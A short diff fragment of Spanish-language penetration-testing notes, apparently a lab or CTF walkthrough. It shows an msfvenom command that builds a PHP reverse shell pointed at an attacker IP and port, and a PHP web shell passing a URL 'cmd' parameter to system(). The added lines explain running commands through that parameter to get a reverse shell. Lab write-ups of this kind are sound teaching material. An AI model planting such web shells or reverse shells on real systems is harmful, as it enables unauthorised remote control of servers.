@@ -82,4 +82,6 @@ msfvenom -p php/reverse_php LHOST=(IP_MAQUINA_ATACANTE) LPORT=(PUERTO) -f raw > 
 		system($_GET['cmd']);
 ?>
 ```
-- Así cuando ejecute
+- Así cuando ejecutemos el directorio, vamos a poder ejecutar comandos en el URL y hacer una reverse para poder entrar.
+- Nos metemos a la URL para ejecutar el directorio que modificamos agregándole `?cmd=(COMANDO)`
+
